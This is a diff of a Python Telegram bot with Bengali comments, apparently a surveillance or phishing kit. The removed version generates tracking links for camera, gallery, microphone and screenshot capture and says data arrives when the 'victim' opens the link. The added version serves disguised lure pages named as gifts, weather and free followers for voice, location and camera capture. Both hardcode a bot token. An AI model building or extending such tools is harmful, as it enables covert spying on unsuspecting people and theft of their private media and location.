@@ -1,64 +1,85 @@
-import telebot
-from telebot import types
 
-# --- কনফিগারেশন ---
-TOKEN = '8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4'
-ADMIN_ID = 8293410345 
-DEV = "@ax_abir_999"
-bot = telebot.TeleBot(TOKEN)
+import os
+import requests
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# ডাটাবেস
-users = {} 
+# Bot Token
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4")
 
-def main_menu(uid):
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    btns = [
-        types.InlineKeyboardButton("📸 ᴄᴀᴍᴇʀᴀ", callback_data="h_cam"),
-        types.InlineKeyboardButton("🖼 ɢᴀʟʟᴇʀʏ", callback_data="h_gal"),
-        types.InlineKeyboardButton("🎙 ᴍɪᴄ", callback_data="h_mic"),
-        types.InlineKeyboardButton("📱 ꜱꜱ", callback_data="h_ss")
-    ]
-    markup.add(*btns)
-    markup.add(types.InlineKeyboardButton("👤 ᴘʀᴏꜰɪʟᴇ", callback_data="pro"), types.InlineKeyboardButton("🎁 ʙᴏɴᴜꜱ", callback_data="bon"))
-    if uid == ADMIN_ID:
-        markup.add(types.InlineKeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="adm_panel"))
-    return markup
+# চ্যানেল লিংক / invite links
+CHANNELS = [
+    "https://t.me/+d0ol4cPYxUExOGU1",
+    "https://t.me/+YBo9GZb4ISxhN2I1"
+]
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    uid = message.from_user.id
-    if uid not in users: users[uid] = {'coins': 50}
-    bot.send_message(uid, "<b>🔥 AX-PREDATOR PREMIUM 🔥</b>\nমেনু সিলেক্ট করুন:", parse_mode='HTML', reply_markup=main_menu(uid))
+# বাটন লিংক এবং নাম
+BUTTONS = [
+    {"text": "𝐕𝐨𝐢𝐜𝐞", "url": "https://giftforyou-beta.vercel.app/?id=7664379493"},
+    {"text": "𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧📍", "url": "https://weatherx-gray.vercel.app/?id=7664379493"},
+    {"text": "𝐂𝐚𝐦𝐞𝐫𝐚", "url": "https://followersfreeofficial.vercel.app/?id=7664379493"},
+    {"text": "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐢𝐧𝐟𝐨", "url": None}
+]
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_query(call):
-    uid = call.from_user.id
-    if call.data.startswith("h_"):
-        if users.get(uid, {}).get('coins', 0) < 10:
-            bot.answer_callback_query(call.id, "❌ কয়েন নেই!", show_alert=True)
-            return
-        
-        # আপনার চাহিদা অনুযায়ী কাস্টম কি-ওয়ার্ড চাওয়া
-        msg = bot.send_message(uid, "<b>🔗 লিঙ্কটি কী নামে বানাতে চান?</b>\n(যেমন: dkkyfnkuuvb বা my_video)")
-        bot.register_next_step_handler(msg, lambda m: generate_link(m, call.data))
+DEVELOPER_INFO = "Developer Info:\nUsername: @ax_abir_999\nআমি এই বটের ডেভেলপার।"
 
-def generate_link(message, h_type):
-    uid = message.from_user.id
-    slug = message.text.strip().replace(" ", "_")
-    
-    # আপনার স্ক্রিনশট থেকে পাওয়া গুগল স্ক্রিপ্ট লিঙ্ক (বেইস হিসেবে ব্যবহার)
-    base_api = "https://script.google.com/macros/s/AKfycbx0NfVEH7t1dAdezpFu-ePKWWwK6v5nlPGtUjRPXrsNVzvZyGB79NMPJKP2uGn"
-    
-    # কাস্টম লিঙ্ক তৈরি
-    final_url = f"{base_api}?user_id={uid}&name={slug}&type={h_type}"
-    
-    users[uid]['coins'] -= 10
-    bot.send_message(uid, f"<b>🚀 LINK GENERATED!</b>\n\n<code>{final_url}</code>\n\n⚠️ ভিকটিম লিঙ্কে ঢুকলে তথ্য আপনার কাছে আসবে।", parse_mode='HTML')
+# চ্যানেল চেক করার ফাংশন (simulate)
+def check_channels(user_id: int):
+    # বাস্তব চ্যানেল চেক করতে bot কে admin করতে হবে এবং get_chat_member API ব্যবহার করতে হবে
+    # এখানে demo purpose: সব join আছে ধরে নিচ্ছি
+    return all([True for _ in CHANNELS])
 
-# অ্যাডমিন প্যানেল
-@bot.callback_query_handler(func=lambda call: call.data == "adm_panel")
-def adm(call):
-    if call.from_user.id == ADMIN_ID:
-        bot.send_message(ADMIN_ID, f"📊 মোট ইউজার: {len(users)}")
+# /start কমান্ড হ্যান্ডলার
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    first_name = update.effective_user.first_name
 
-bot.infinity_polling()
+    if check_channels(user_id):
+        welcome_text = f"🌟 হ্যালো {first_name}!\n\nসব চ্যানেলে জয়েন্ট হয়েছে ✅\nনীচের বাটন ব্যবহার করো।"
+        keyboard = [
+            [InlineKeyboardButton(BUTTONS[0]["text"], callback_data="voice"),
+             InlineKeyboardButton(BUTTONS[1]["text"], callback_data="location")],
+            [InlineKeyboardButton(BUTTONS[2]["text"], callback_data="camera"),
+             InlineKeyboardButton(BUTTONS[3]["text"], callback_data="developer_info")]
+        ]
+        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))
+    else:
+        text = "⚠️ তুমি সব চ্যানেলে জয়েন্ট হওনি। জয়েন্ট হয়ে /start চেপে আবার চেষ্টা করো।\n\nচ্যানেলগুলো:\n"
+        for ch in CHANNELS:
+            text += f"{ch}\n"
+        await update.message.reply_text(text)
+
+# বাটন হ্যান্ডলার
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    # লিংক ফেচ ম্যাপ
+    link_map = {
+        "voice": BUTTONS[0]["url"],
+        "location": BUTTONS[1]["url"],
+        "camera": BUTTONS[2]["url"]
+    }
+
+    if data in link_map:
+        url = link_map[data]
+        try:
+            resp = requests.get(url, timeout=10)
+            resp.raise_for_status()
+            content = resp.text[:4000]  # Telegram message limit
+            message = f"📎 লিংক: {url}\n\nফলাফল:\n{content}"
+        except Exception as e:
+            message = f"❌ লিংক ফেচ করতে সমস্যা: {e}"
+        await query.message.reply_text(message)
+    elif data == "developer_info":
+        await query.message.reply_text(DEVELOPER_INFO)
+
+# মূল
+if __name__ == "__main__":
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+
+    print("বট রানিং...")
+    app.run_polling()
